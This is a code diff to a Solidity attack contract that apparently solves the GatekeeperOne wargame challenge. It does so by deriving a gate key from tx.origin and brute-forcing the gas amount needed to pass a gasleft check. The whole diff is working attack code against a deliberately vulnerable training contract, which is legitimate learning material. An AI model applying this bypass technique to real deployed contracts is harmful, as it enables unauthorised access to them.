@@ -4,15 +4,14 @@ pragma solidity ^0.8.15;
 import { GatekeeperOne } from "src/GatekeeperOne/GatekeeperOne.sol";
 import { toBytes } from "src/utils/toBytes.sol";
 
-
 contract GatekeeperOneAttack {
-    address public gatekeeperOneInstance = address(0x536734cD63fb1E3b318eC09d7e0709737da436C0);
+    // address public gatekeeperOneInstance = address(0x536734cD63fb1E3b318eC09d7e0709737da436C0);
 
     event GasPassed(uint indexed gasUsed);
     event GasFailed(uint indexed gasUsed);
     event Hacked(bool indexed success);
 
-    function attack(address targetAddress) external {
+    function attack(address targetAddress, uint magicGasAmount) external returns (bool success) {
         /* Calculating the gate key. Here are the requirements for Gate 3:::
 
             require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
@@ -38,28 +37,31 @@ contract GatekeeperOneAttack {
                 bytes8(uint64(uint160(msg.sender)) & 0xFFFFFFFF0000FFFF)
         */
         bytes8 gateKey = bytes8(uint64(uint160(tx.origin)) & uint64(0xFFFFFFFF0000FFFF));
-        // Found gas amount via GatekeeperOneAttackFork.testForkRealAttack():
+        // Found gas amount via GatekeeperOneAttackFork.testForkRealGasAttack():
         // emit GasPassed(gasUsed: 24827)
-        bool success = GatekeeperOne(targetAddress).enter{gas: 24827}(gateKey);
+        success = GatekeeperOne(targetAddress).enter{gas: magicGasAmount}(gateKey);
 
         emit Hacked(success);
+
+        // named return value or not, I think it makes sense to explicitly return values 🤷‍♂️
+        return success;
     }
 
-    function gasAttack() external returns (bool success) {
+    function gasAttack(address targetAddress) external returns (bool success, uint gasAmount) {
         uint muhgas; // brute force to find gas amount as we reach Gate 2
         uint gasBase = 8191 * 3; // gas needs to be a multiple of 8191. 3 is the lowest that will complete the tx
         bytes8 gateKey = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);
 
         for (muhgas = 0; muhgas <= 8191; muhgas++) {
-            try GatekeeperOne(gatekeeperOneInstance).enter{gas: (muhgas + gasBase)}(gateKey) {
+            try GatekeeperOne(targetAddress).enter{gas: (muhgas + gasBase)}(gateKey) {
                 emit GasPassed(gasBase + muhgas);
                 success = true;
                 break;
             } catch {
                 emit GasFailed(gasBase + muhgas);
-                continue;
             }
         }
-        assert(success);
+
+        return (success, gasBase + muhgas);
     }
 }
